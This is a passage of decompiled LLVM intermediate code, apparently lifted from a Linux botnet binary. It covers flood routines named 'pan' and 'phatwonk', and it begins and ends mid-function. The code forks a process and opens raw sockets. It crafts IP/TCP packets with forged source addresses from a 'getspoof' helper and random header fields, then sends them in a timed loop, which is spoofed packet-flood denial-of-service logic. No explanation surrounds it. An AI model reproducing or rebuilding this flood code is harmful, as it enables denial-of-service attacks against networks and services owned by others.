  %v1_804b7fb = inttoptr i32 %v1_804b7f8 to i32*
  %v2_804b7fb = load i32, i32* %v1_804b7fb, align 4
  %v1_804b801 = call i32 @atol(i32 %v2_804b7fb)
  %v2_804b80c = ptrtoint i32* %stack_var_-1560 to i32
  %tmp50 = bitcast i32* %stack_var_-1540 to i16*
  store i32 1472, i32* %stack_var_-1620, align 4
  %v4_804b83a = bitcast i32* %stack_var_-1532 to i8*
  %v5_804b83a = call i32 @__GI_memset(i8* %v4_804b83a, i32 10, i32 1472)
  store i32 %arg2, i32* %stack_var_-1620, align 4
  %v3_804b856 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_8069677.157 to i32))
  %v3_804b869 = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_804b869, align 4
  %v1_804b87b = or i32 %v2_804b80c, 1
  %v2_804b87b = inttoptr i32 %v1_804b87b to i8*
  store i8 0, i8* %v2_804b87b, align 1
  %v1_804b882 = or i32 %v2_804b80c, 2
  %v2_804b882 = inttoptr i32 %v1_804b882 to i16*
  store i16 1500, i16* %v2_804b882, align 2
  %v1_804b88b = add i32 %v2_804b80c, 6
  %v2_804b88b = inttoptr i32 %v1_804b88b to i16*
  store i16 0, i16* %v2_804b88b, align 2
  %v1_804b894 = add i32 %v2_804b80c, 9
  %v2_804b894 = inttoptr i32 %v1_804b894 to i8*
  store i8 17, i8* %v2_804b894, align 1
  %v1_804b89b = add i32 %v2_804b80c, 8
  %v2_804b89b = inttoptr i32 %v1_804b89b to i8*
  store i8 64, i8* %v2_804b89b, align 4
  %v2_804b8a5 = add i32 %v2_804b80c, 16
  %v3_804b8a5 = inttoptr i32 %v2_804b8a5 to i32*
  store i32 %v3_804b7d3, i32* %v3_804b8a5, align 4
  %v1_804b8ab = urem i32 %tmp13, 65536
  %v1_804b8b4 = call i32 @htons(i32 %v1_804b8ab)
  %v2_804b8b4 = trunc i32 %v1_804b8b4 to i16
  %v4_804b8be = ptrtoint i32* %stack_var_-1540 to i32
  %v3_804b8c1 = add i32 %v4_804b8be, 4
  %v4_804b8c1 = inttoptr i32 %v3_804b8c1 to i16*
  store i16 %v2_804b8b4, i16* %v4_804b8c1, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v4_804b8de = icmp eq i32 %v1_804b7ea, 0
  %v3_804b90d = or i32 %v4_804b8be, 2
  %v4_804b90d = inttoptr i32 %v3_804b90d to i16*
  %v2_804b91d = bitcast i32* %stack_var_-1560 to i16*
  %v3_804b92a = add i32 %v4_804b8be, 6
  %v4_804b92a = inttoptr i32 %v3_804b92a to i16*
  %v2_804b938 = add i32 %v2_804b80c, 12
  %v3_804b938 = inttoptr i32 %v2_804b938 to i32*
  %v3_804b945 = add i32 %v2_804b80c, 4
  %v4_804b945 = inttoptr i32 %v3_804b945 to i16*
  %v3_804b962 = add i32 %v2_804b80c, 10
  %v4_804b962 = inttoptr i32 %v3_804b962 to i16*
  %v2_804b971 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804b9ab = add i32 %v1_804b801, %v2_804b756
  %v1_804b8e7 = urem i32 %v1_804b7ea, 65536
  br label %dec_label_pc_804b8d1

dec_label_pc_804b8d1:                             ; preds = %dec_label_pc_804b9c3, %dec_label_pc_804b7c4
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804b7c4 ], [ %v4_804b9c3, %dec_label_pc_804b9c3 ]
  %v0_804b8d1 = call i32 @random()
  %sext = mul i32 %v0_804b8d1, 65536
  %v1_804b8d6 = sdiv i32 %sext, 65536
  %v1_804b8db = trunc i32 %v1_804b8d6 to i16
  store i16 %v1_804b8db, i16* %tmp50, align 4
  br i1 %v4_804b8de, label %dec_label_pc_804b903, label %dec_label_pc_804b8e4

dec_label_pc_804b8e4:                             ; preds = %dec_label_pc_804b8d1
  %v1_804b8f0 = call i32 @htons(i32 %v1_804b8e7)
  br label %dec_label_pc_804b911

dec_label_pc_804b903:                             ; preds = %dec_label_pc_804b8d1
  %v0_804b903 = call i32 @random()
  %sext6 = mul i32 %v0_804b903, 65536
  %v1_804b908 = sdiv i32 %sext6, 65536
  br label %dec_label_pc_804b911

dec_label_pc_804b911:                             ; preds = %dec_label_pc_804b8e4, %dec_label_pc_804b903
  %storemerge.in = phi i32 [ %v1_804b908, %dec_label_pc_804b903 ], [ %v1_804b8f0, %dec_label_pc_804b8e4 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i16 %storemerge, i16* %v4_804b90d, align 2
  store i32 %v2_804b80c, i32* %stack_var_-1620, align 4
  %v3_804b91d = call i32 @in_cksum(i16* %v2_804b91d, i32 1500)
  %v4_804b91d = trunc i32 %v3_804b91d to i16
  store i16 %v4_804b91d, i16* %v4_804b92a, align 2
  %v0_804b92e = load i32, i32* %stack_var_-1620, align 4
  %v1_804b92e = call i32 @getspoof(i32 %v0_804b92e)
  store i32 %v1_804b92e, i32* %v3_804b938, align 4
  %v0_804b93b = call i32 @random()
  %sext5 = mul i32 %v0_804b93b, 65536
  %v1_804b940 = sdiv i32 %sext5, 65536
  %v1_804b945 = trunc i32 %v1_804b940 to i16
  store i16 %v1_804b945, i16* %v4_804b945, align 4
  store i32 %v2_804b80c, i32* %stack_var_-1620, align 4
  %v3_804b955 = call i32 @in_cksum(i16* %v2_804b91d, i32 1500)
  %v4_804b955 = trunc i32 %v3_804b955 to i16
  store i16 %v4_804b955, i16* %v4_804b962, align 2
  %v7_804b98b = call i32 @sendto(i32 %v3_804b783, i32 %v2_804b80c, i32 1500, i32 0, i32 %v2_804b971, i32 16)
  %tmp51 = icmp ult i32 %stack_var_-40.0, 100
  br i1 %tmp51, label %dec_label_pc_804b9c3, label %dec_label_pc_804b999

dec_label_pc_804b999:                             ; preds = %dec_label_pc_804b911
  %v2_804b99e = call i32 @__GI_time(i32* null)
  %v7_804b9ae = icmp ult i32 %v2_804b99e, %v5_804b9ab
  br i1 %v7_804b9ae, label %dec_label_pc_804b9c3, label %dec_label_pc_804b9b2

dec_label_pc_804b9b2:                             ; preds = %dec_label_pc_804b999
  %v1_804b9b7 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b9c3

dec_label_pc_804b9c3:                             ; preds = %dec_label_pc_804b9b2, %dec_label_pc_804b999, %dec_label_pc_804b911
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804b911 ], [ 0, %dec_label_pc_804b999 ], [ 0, %dec_label_pc_804b9b2 ]
  %v4_804b9c3 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_804b8d1

dec_label_pc_804b9cb:                             ; preds = %entry
  ret i32 %v1_804b767

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v2_804b80c, { 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %v4_804b79e, { 1, 0 }
  uselistorder i32* %stack_var_-1620, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b911, { 1, 0 }
  uselistorder label %dec_label_pc_804b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_804b79e, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-88 = alloca i16, align 2
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-160 = alloca i16, align 2
  %stack_var_-108 = alloca i8, align 1
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v15_804b9d1 = ptrtoint i32* %stack_var_-268 to i32
  %v2_804b9d7 = ptrtoint i32* %stack_var_-256 to i32
  store i32 ptrtoint (i32* @global_var_80696a0.158 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804b9d7, i32* %stack_var_-284, align 4
  %v3_804b9ed = bitcast i32* %stack_var_-256 to i16*
  %v4_804b9ed = call i32 @memcpy(i16* %v3_804b9ed, i32 ptrtoint (i32* @global_var_80696a0.158 to i32), i32 80)
  store i32 0, i32* %stack_var_-284, align 4
  %v2_804ba08 = call i32 @__GI_time(i32* null)
  store i32 %v2_804ba08, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v1_804ba19 = call i32 @mfork(i32 %arg2)
  %v1_804ba21 = icmp eq i32 %v1_804ba19, 0
  %v1_804ba23 = icmp eq i1 %v1_804ba21, false
  br i1 %v1_804ba23, label %dec_label_pc_804bd80, label %dec_label_pc_804ba29

dec_label_pc_804ba29:                             ; preds = %entry
  store i32 2, i32* %stack_var_-284, align 4
  %v3_804ba35 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804ba40 = icmp slt i32 %v3_804ba35, 0
  %v1_804ba44 = icmp eq i1 %v5_804ba40, false
  br i1 %v1_804ba44, label %dec_label_pc_804ba50, label %dec_label_pc_804ba46

dec_label_pc_804ba46:                             ; preds = %dec_label_pc_804ba29
  store i32 1, i32* %stack_var_-284, align 4
  %v1_804ba4b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804ba50

dec_label_pc_804ba50:                             ; preds = %dec_label_pc_804ba29, %dec_label_pc_804ba46
  %v4_804ba50 = add i32 %arg3, -2
  %v9_804ba50 = sub i32 1, %arg3
  %v10_804ba50 = and i32 %v9_804ba50, %arg3
  %v11_804ba50 = icmp slt i32 %v10_804ba50, 0
  %v12_804ba50 = icmp eq i32 %v4_804ba50, 0
  %v13_804ba50 = icmp slt i32 %v4_804ba50, 0
  %v3_804ba54 = icmp eq i1 %v13_804ba50, %v11_804ba50
  %v4_804ba54 = icmp eq i1 %v12_804ba50, false
  %v5_804ba54 = and i1 %v4_804ba54, %v3_804ba54
  br i1 %v5_804ba54, label %dec_label_pc_804ba93.preheader, label %dec_label_pc_804ba56

dec_label_pc_804ba56:                             ; preds = %dec_label_pc_804ba50
  %v3_804ba64 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80696f0.159 to i32))
  %v1_804ba71 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804ba93.preheader

dec_label_pc_804ba93.preheader:                   ; preds = %dec_label_pc_804ba50, %dec_label_pc_804ba56
  br label %dec_label_pc_804ba7f

dec_label_pc_804ba7f:                             ; preds = %dec_label_pc_804ba93.preheader, %dec_label_pc_804ba7f
  %storemerge89 = phi i32 [ 0, %dec_label_pc_804ba93.preheader ], [ %v4_804ba90, %dec_label_pc_804ba7f ]
  store i32 %storemerge89, i32* @edx, align 4
  %v0_804ba85 = load i32, i32* @ebp, align 4
  %v2_804ba85 = mul nuw nsw i32 %storemerge89, 4
  %v3_804ba85 = add nuw nsw i32 %v2_804ba85, -252
  %v4_804ba85 = add i32 %v3_804ba85, %v0_804ba85
  %v5_804ba85 = inttoptr i32 %v4_804ba85 to i32*
  %v6_804ba85 = load i32, i32* %v5_804ba85, align 4
  %v1_804ba8c = trunc i32 %v6_804ba85 to i8
  %v4_804ba8c = add nuw nsw i32 %storemerge89, -64
  %v5_804ba8c = add i32 %v4_804ba8c, %v0_804ba85
  %v6_804ba8c = inttoptr i32 %v5_804ba8c to i8*
  store i8 %v1_804ba8c, i8* %v6_804ba8c, align 1
  %v4_804ba90 = add nuw nsw i32 %storemerge89, 1
  %exitcond = icmp eq i32 %v4_804ba90, 20
  br i1 %exitcond, label %dec_label_pc_804ba99, label %dec_label_pc_804ba7f

dec_label_pc_804ba99:                             ; preds = %dec_label_pc_804ba7f
  %v1_804ba9c = add i32 %arg4, 4
  %v1_804ba9f = inttoptr i32 %v1_804ba9c to i32*
  %v2_804ba9f = load i32, i32* %v1_804ba9f, align 4
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v2_804baa8 = call i32 @host2ip(i32 %arg2, i32 %v2_804ba9f)
  %v1_804bab6 = add i32 %arg4, 12
  %v1_804bab9 = inttoptr i32 %v1_804bab6 to i32*
  %v2_804bab9 = load i32, i32* %v1_804bab9, align 4
  store i32 %v2_804bab9, i32* %stack_var_-284, align 4
  %v1_804babf = call i32 @atol(i32 %v2_804bab9)
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_804bade = call i32 @Send(i32 %arg1, i32 ptrtoint ([23 x i8]* @global_var_8069717.160 to i32))
  store i8 69, i8* %stack_var_-108, align 1
  %v1_804bb71 = add i32 %arg4, 8
  %v1_804bb74 = inttoptr i32 %v1_804bb71 to i32*
  %v2_804bb74 = load i32, i32* %v1_804bb74, align 4
  store i32 %v2_804bb74, i32* %stack_var_-284, align 4
  %v1_804bb7a = call i32 @atol(i32 %v2_804bb74)
  %v1_804bb82 = urem i32 %v1_804bb7a, 65536
  store i32 %v1_804bb82, i32* %stack_var_-284, align 4
  %v1_804bb8b = call i32 @htons(i32 %v1_804bb82)
  %v5_804bb98 = trunc i32 %v1_804bb8b to i16
  store i32 0, i32* %stack_var_-284, align 4
  %v2_804bba0 = call i32 @__GI_time(i32* null)
  store i32 %v2_804bba0, i32* @ebx, align 4
  %v1_804bbaa = call i32 @__libc_getpid(i32 0)
  %v0_804bbaf = load i32, i32* @ebx, align 4
  %v2_804bbaf = add i32 %v0_804bbaf, %v1_804bbaa
  store i32 %v2_804bbaf, i32* %stack_var_-284, align 4
  %v1_804bbb6 = call i32 @srand(i32 %v2_804bbaf)
  %v2_804bc3f = ptrtoint i8* %stack_var_-108 to i32
  %v2_804bccd = ptrtoint i16* %stack_var_-160 to i32
  %v2_804bcd3 = ptrtoint i32* %stack_var_-148 to i32
  %v15_804bcd9 = ptrtoint i16* %stack_var_-88 to i32
  %v12_804bcf7 = ptrtoint i32* %stack_var_-128 to i32
  %v15_804bcfe = ptrtoint i32* %stack_var_-68 to i32
  %v2_804bd24 = ptrtoint i32* %stack_var_-176 to i32
  %v5_804bd60 = add i32 %v1_804babf, %v2_804ba08
  br label %dec_label_pc_804bbbe

dec_label_pc_804bbbe:                             ; preds = %dec_label_pc_804bd78, %dec_label_pc_804ba99
  %v0_804bbc6 = phi i32 [ %v15_804b9d1, %dec_label_pc_804ba99 ], [ %v0_804bbc6.pre, %dec_label_pc_804bd78 ]
  %stack_var_-36.0 = phi i16 [ %v5_804bb98, %dec_label_pc_804ba99 ], [ %stack_var_-36.1, %dec_label_pc_804bd78 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_804ba99 ], [ %v4_804bd78, %dec_label_pc_804bd78 ]
  %v2_804bbc4 = load i32, i32* %v1_804bb74, align 4
  %v2_804bbc9 = add i32 %v0_804bbc6, -16
  %v3_804bbc9 = inttoptr i32 %v2_804bbc9 to i32*
  store i32 %v2_804bbc4, i32* %v3_804bbc9, align 4
  %v0_804bbca = load i32, i32* %stack_var_-284, align 4
  %v1_804bbca = call i32 @atol(i32 %v0_804bbca)
  %v1_804bbd2 = icmp eq i32 %v1_804bbca, 0
  %v1_804bbd4 = icmp eq i1 %v1_804bbd2, false
  br i1 %v1_804bbd4, label %dec_label_pc_804bbde, label %dec_label_pc_804bbd6

dec_label_pc_804bbd6:                             ; preds = %dec_label_pc_804bbbe
  %v0_804bbd6 = call i32 @random()
  %v1_804bbd6 = trunc i32 %v0_804bbd6 to i16
  br label %dec_label_pc_804bbde

dec_label_pc_804bbde:                             ; preds = %dec_label_pc_804bbbe, %dec_label_pc_804bbd6
  %stack_var_-36.1 = phi i16 [ %stack_var_-36.0, %dec_label_pc_804bbbe ], [ %v1_804bbd6, %dec_label_pc_804bbd6 ]
  %v1_804bbde = sext i16 %stack_var_-36.1 to i32
  %v2_804bbde = call i32 @getspoof(i32 %v1_804bbde)
  %v3_804bbde = trunc i32 %v2_804bbde to i16
  %v0_804bbf1 = load i32, i32* @esp, align 4
  %v2_804bbf4 = add i32 %v0_804bbf1, -16
  %v3_804bbf4 = inttoptr i32 %v2_804bbf4 to i32*
  store i32 60, i32* %v3_804bbf4, align 4
  %sext13 = mul i32 %v2_804bbde, 65536
  %v1_804bbf5 = sdiv i32 %sext13, 65536
  %v2_804bbf5 = call i32 @htons(i32 %v1_804bbf5)
  %v1_804bc01 = call i32 @random()
  store i16 %v3_804bbde, i16* %stack_var_-88, align 2
  %v1_804bc24 = call i32 @random()
  %v0_804bc42 = load i32, i32* @esp, align 4
  %v1_804bc42 = add i32 %v0_804bc42, -4
  %v2_804bc42 = inttoptr i32 %v1_804bc42 to i32*
  store i32 20, i32* %v2_804bc42, align 4
  %v2_804bc44 = add i32 %v0_804bc42, -8
  %v3_804bc44 = inttoptr i32 %v2_804bc44 to i32*
  store i32 %v2_804bc3f, i32* %v3_804bc44, align 4
  %v3_804bc45 = inttoptr i32 %v1_804bbde to i16*
  %v4_804bc45 = call i32 @in_cksum(i16* %v3_804bc45, i32 %v2_804baa8)
  %v1_804bc51 = call i32 @random()
  store i16 %v3_804bbde, i16* %stack_var_-160, align 2
  %v0_804bcba = load i32, i32* @esp, align 4
  %v2_804bcbd = add i32 %v0_804bcba, -16
  %v3_804bcbd = inttoptr i32 %v2_804bcbd to i32*
  store i32 40, i32* %v3_804bcbd, align 4
  %sext25 = mul i32 %v1_804bc51, 16777216
  %v1_804bcbe = sdiv i32 %sext25, 16777216
  %v2_804bcbe = call i32 @htons(i32 %v1_804bcbe)
  %v0_804bcc3 = load i32, i32* @esp, align 4
  store i32 %v2_804bcd3, i32* %edx.global-to-local, align 4
  %v1_804bcdf = add i32 %v0_804bcc3, 8
  %v2_804bcdf = inttoptr i32 %v1_804bcdf to i32*
  store i32 20, i32* %v2_804bcdf, align 4
  %v2_804bce1 = add i32 %v0_804bcc3, 4
  %v3_804bce1 = inttoptr i32 %v2_804bce1 to i32*
  store i32 %v2_804bcd3, i32* %v3_804bce1, align 4
  %v3_804bce2 = inttoptr i32 %v0_804bcc3 to i32*
  store i32 %v15_804bcd9, i32* %v3_804bce2, align 4
  %sext17 = mul i32 %v2_804bcbe, 65536
  %v1_804bce3 = sdiv i32 %sext17, 65536
  %v4_804bce3 = call i32 @bcopy(i32 %v1_804bce3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804bce8 = load i32, i32* @esp, align 4
  %v5_804bcee = add i32 %v0_804bce8, 8
  %v6_804bcee = inttoptr i32 %v5_804bcee to i32*
  store i32 20, i32* %v6_804bcee, align 4
  %v2_804bcfa = add i32 %v0_804bce8, 4
  %v3_804bcfa = inttoptr i32 %v2_804bcfa to i32*
  store i32 %v12_804bcf7, i32* %v3_804bcfa, align 4
  %v3_804bd01 = inttoptr i32 %v0_804bce8 to i32*
  store i32 %v15_804bcfe, i32* %v3_804bd01, align 4
  %v4_804bd02 = call i32 @bcopy(i32 %v1_804bce3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804bd07 = load i32, i32* @esp, align 4
  store i32 %v2_804bccd, i32* %edx.global-to-local, align 4
  %v2_804bd16 = add i32 %v0_804bd07, 12
  %v3_804bd16 = inttoptr i32 %v2_804bd16 to i32*
  store i32 52, i32* %v3_804bd16, align 4
  %v2_804bd17 = add i32 %v0_804bd07, 8
  %v3_804bd17 = inttoptr i32 %v2_804bd17 to i32*
  store i32 %v2_804bccd, i32* %v3_804bd17, align 4
  %v3_804bd18 = inttoptr i32 %v1_804bce3 to i16*
  %v4_804bd18 = call i32 @in_cksum(i16* %v3_804bd18, i32 ptrtoint (i32* @0 to i32))
  %v0_804bd1d = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v1_804bd33 = add i32 %v0_804bd1d, -4
  %v2_804bd33 = inttoptr i32 %v1_804bd33 to i32*
  store i32 16, i32* %v2_804bd33, align 4
  %v2_804bd35 = add i32 %v0_804bd1d, -8
  %v3_804bd35 = inttoptr i32 %v2_804bd35 to i32*
  store i32 %v2_804bd24, i32* %v3_804bd35, align 4
  %v1_804bd36 = add i32 %v0_804bd1d, -12
  %v2_804bd36 = inttoptr i32 %v1_804bd36 to i32*
  store i32 0, i32* %v2_804bd36, align 4
  %v0_804bd38 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd38 = add i32 %v0_804bd1d, -16
  %v3_804bd38 = inttoptr i32 %v2_804bd38 to i32*
  store i32 %v0_804bd38, i32* %v3_804bd38, align 4
  %v2_804bd3c = add i32 %v0_804bd1d, -20
  %v3_804bd3c = inttoptr i32 %v2_804bd3c to i32*
  store i32 %v2_804bc3f, i32* %v3_804bd3c, align 4
  %v5_804bd3d = add i32 %v0_804bd1d, -24
  %v6_804bd3d = inttoptr i32 %v5_804bd3d to i32*
  store i32 %v3_804ba35, i32* %v6_804bd3d, align 4
  %v1_804bd40 = load i32, i32* %stack_var_-68, align 4
  %sext20 = mul i32 %v4_804bd18, 65536
  %v2_804bd40 = sdiv i32 %sext20, 65536
  %v7_804bd40 = call i32 @sendto(i32 %v2_804bd40, i32 %v1_804bd40, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804bd45 = load i32, i32* @esp, align 4
  %v1_804bd45 = add i32 %v0_804bd45, 32
  %tmp90 = icmp ult i32 %stack_var_-48.0, 100
  br i1 %tmp90, label %dec_label_pc_804bd78, label %dec_label_pc_804bd4e

dec_label_pc_804bd4e:                             ; preds = %dec_label_pc_804bbde
  %v1_804bd51 = add i32 %v0_804bd45, 16
  %v2_804bd51 = inttoptr i32 %v1_804bd51 to i32*
  store i32 0, i32* %v2_804bd51, align 4
  %v2_804bd53 = inttoptr i32 %v2_804bd40 to i32*
  %v3_804bd53 = call i32 @__GI_time(i32* %v2_804bd53)
  %v0_804bd58 = load i32, i32* @esp, align 4
  %v1_804bd58 = add i32 %v0_804bd58, 16
  store i32 %v3_804bd53, i32* %edx.global-to-local, align 4
  %v7_804bd63 = icmp ult i32 %v3_804bd53, %v5_804bd60
  br i1 %v7_804bd63, label %dec_label_pc_804bd78, label %dec_label_pc_804bd67

dec_label_pc_804bd67:                             ; preds = %dec_label_pc_804bd4e
  %v2_804bd6a = inttoptr i32 %v0_804bd58 to i32*
  store i32 0, i32* %v2_804bd6a, align 4
  %v2_804bd6c = call i32 @__GI_exit(i32 %v2_804bd40)
  %v0_804bbc6.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bd78

dec_label_pc_804bd78:                             ; preds = %dec_label_pc_804bd67, %dec_label_pc_804bd4e, %dec_label_pc_804bbde
  %v0_804bbc6.pre = phi i32 [ %v1_804bd45, %dec_label_pc_804bbde ], [ %v1_804bd58, %dec_label_pc_804bd4e ], [ %v0_804bbc6.pre.pre, %dec_label_pc_804bd67 ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_804bbde ], [ 0, %dec_label_pc_804bd4e ], [ 0, %dec_label_pc_804bd67 ]
  %v4_804bd78 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_804bbbe

dec_label_pc_804bd80:                             ; preds = %entry
  ret i32 %v1_804ba19

; uselistorder directives
  uselistorder i32 %v2_804bd40, { 2, 1, 0 }
  uselistorder i32 %v0_804bce8, { 1, 0, 2 }
  uselistorder i32 %v1_804bce3, { 2, 1, 0 }
  uselistorder i32 %v0_804bcc3, { 2, 0, 1 }
  uselistorder i16 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %v2_804bbaf, { 1, 0 }
  uselistorder i32 %v2_804bb74, { 1, 0 }
  uselistorder i32 %v2_804bab9, { 1, 0 }
  uselistorder i32 %storemerge89, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804ba50, { 1, 0 }
  uselistorder i16* %stack_var_-160, { 1, 0 }
  uselistorder i16* %stack_var_-88, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bbde, { 1, 0 }
  uselistorder label %dec_label_pc_804ba7f, { 1, 0 }
  uselistorder label %dec_label_pc_804ba93.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ba50, { 1, 0 }
}

define i32 @phatwonk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp109 = call i8 @__decompiler_undefined_function_5()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-100 = alloca i16, align 2
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i16, align 2
  %stack_var_-120 = alloca i8, align 1
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_80697c0.161 to i32), i32* %edx.global-to-local, align 4
  %v5_804bda0 = icmp ult i32* %stack_var_-508, inttoptr (i32 4 to i32*)
  store i1 %v5_804bda0, i1* %cf.global-to-local, align 1
  %v3_804bda6 = bitcast i32* %stack_var_-268 to i16*
  %v4_804bda6 = call i32 @memcpy(i16* %v3_804bda6, i32 ptrtoint (i32* @global_var_80697c0.161 to i32), i32 80)
  store i32 ptrtoint (i32* @global_var_8069740.162 to i32), i32* %edx.global-to-local, align 4
  store i1 %v5_804bda0, i1* %cf.global-to-local, align 1
  %v3_804bdd2 = bitcast i32* %stack_var_-396 to i16*
  %v4_804bdd2 = call i32 @memcpy(i16* %v3_804bdd2, i32 ptrtoint (i32* @global_var_8069740.162 to i32), i32 124)
  %v5_804bde1 = icmp ult i32* %stack_var_-508, inttoptr (i32 12 to i32*)
  store i1 %v5_804bde1, i1* %cf.global-to-local, align 1
  %v2_804bde6 = call i32 @__GI_time(i32* null)
  store i32 %v2_804bde6, i32* @eax, align 4
  store i1 %v5_804bde1, i1* %cf.global-to-local, align 1
  %v1_804bdf7 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bdff = icmp eq i32 %v1_804bdf7, 0
  %v1_804be01 = icmp eq i1 %v1_804bdff, false
  br i1 %v1_804be01, label %dec_label_pc_804c4a6, label %dec_label_pc_804be07

dec_label_pc_804be07:                             ; preds = %entry
  store i1 %v5_804bda0, i1* %cf.global-to-local, align 1
  %v3_804be13 = call i32 @socket(i32 2, i32 3, i32 255)
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804be1e = icmp slt i32 %v3_804be13, 0
  %v1_804be22 = icmp eq i1 %v5_804be1e, false
  br i1 %v1_804be22, label %dec_label_pc_804be2e, label %dec_label_pc_804be24

dec_label_pc_804be24:                             ; preds = %dec_label_pc_804be07
  store i1 %v5_804bde1, i1* %cf.global-to-local, align 1
  %v1_804be29 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804be2e

dec_label_pc_804be2e:                             ; preds = %dec_label_pc_804be07, %dec_label_pc_804be24
  %v4_804be2e = add i32 %arg3, -2
  %v8_804be2e = icmp ult i32 %arg3, 2
  %v9_804be2e = sub i32 1, %arg3
  %v10_804be2e = and i32 %v9_804be2e, %arg3
  %v11_804be2e = icmp slt i32 %v10_804be2e, 0
  store i1 %v8_804be2e, i1* %cf.global-to-local, align 1
  %v12_804be2e = icmp eq i32 %v4_804be2e, 0
  %v13_804be2e = icmp slt i32 %v4_804be2e, 0
  %v3_804be32 = icmp eq i1 %v13_804be2e, %v11_804be2e
  %v4_804be32 = icmp eq i1 %v12_804be2e, false
  %v5_804be32 = and i1 %v4_804be32, %v3_804be32
  br i1 %v5_804be32, label %dec_label_pc_804be71.preheader, label %dec_label_pc_804be34

dec_label_pc_804be34:                             ; preds = %dec_label_pc_804be2e
  %v0_804be34 = load i32, i32* @esp, align 4
  %v5_804be34 = icmp ult i32 %v0_804be34, 4
  store i1 %v5_804be34, i1* %cf.global-to-local, align 1
  %v2_804be42 = call i32 @Send(i32 %arg1, i32 ptrtoint ([52 x i8]* @global_var_8069810.163 to i32))
  store i1 %v5_804bde1, i1* %cf.global-to-local, align 1
  %v1_804be4f = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804be71.preheader

dec_label_pc_804be71.preheader:                   ; preds = %dec_label_pc_804be2e, %dec_label_pc_804be34
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804be5d

dec_label_pc_804be5d:                             ; preds = %dec_label_pc_804be71.preheader, %dec_label_pc_804be5d
  %storemerge150 = phi i32 [ 0, %dec_label_pc_804be71.preheader ], [ %v4_804be6e, %dec_label_pc_804be5d ]
  store i32 %storemerge150, i32* @edx, align 4
  %v0_804be63 = load i32, i32* @ebp, align 4
  %v2_804be63 = mul nuw nsw i32 %storemerge150, 4
  %v3_804be63 = add nuw nsw i32 %v2_804be63, -264
  %v4_804be63 = add i32 %v3_804be63, %v0_804be63
  %v5_804be63 = inttoptr i32 %v4_804be63 to i32*
  %v6_804be63 = load i32, i32* %v5_804be63, align 4
  %v1_804be6a = trunc i32 %v6_804be63 to i8
  %v4_804be6a = add nuw nsw i32 %storemerge150, -76
  %v5_804be6a = add i32 %v4_804be6a, %v0_804be63
  %v6_804be6a = inttoptr i32 %v5_804be6a to i8*
  store i8 %v1_804be6a, i8* %v6_804be6a, align 1
